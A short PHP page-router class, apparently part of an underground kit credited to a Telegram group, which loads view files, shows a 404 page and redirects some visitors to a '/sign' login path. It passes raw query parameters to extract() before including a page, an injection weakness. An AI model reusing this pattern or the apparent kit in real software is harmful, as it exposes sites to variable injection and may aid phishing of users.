<?php
/*   __________________________________________________
    |                  CHILD RICH                      |
    |            on 2024-09-23 20:05:17                |
    |    Group : https://t.me/childrichgroup           |
    |__________________________________________________|
*/
<?php
class PageLoader {
    private $viewsPath = 'App/Prosess/';
    private $requestHandler;

    public function loadPage($page, $queryParams) {
        $this->requestHandler = new RequestHandler(); 
        $page = trim($page, '/');
        $filePath = $this->viewsPath . $page . '.php'; 
        if ($this->isValidPage($page)) {
            if (file_exists($filePath)) {
                $this->includePage($filePath, $queryParams);
            } else {
                if (isset($queryParams[$this->requestHandler->getdata('parameter')])) {
                    $this->redirectToHome();
                    return;
                }
                $this->loadNotFoundPage("Anjay Lagi Santai Kawan.");
            }
        } else {
            if (isset($queryParams[$this->requestHandler->getdata('parameter')])) {
            $this->redirectToHome();
            return;
        }
            $this->loadNotFoundPage("Anjay Lagi Santai Kawan.");
        }
    }

    private function isValidPage($page) {
        $validPages = array_diff(scandir($this->viewsPath), array('..', '.'));
        $validPages = array_map(function($file) {
            return pathinfo($file, PATHINFO_FILENAME);
        }, $validPages);
        
        return in_array($page, $validPages);
    }

    private function includePage($filePath, $queryParams) {
        ob_start();
        extract($queryParams); 
        include $filePath;
        echo ob_get_clean();
    }

    private function loadNotFoundPage($pesan) {
        require $this->viewsPath.'404.php';
    }

    private function redirectToHome() {
        $_SESSION['login_count'] = 0;
        $_SESSION['homepage'] = "aktif";
        header("Location: /sign");
        exit;
    }
}
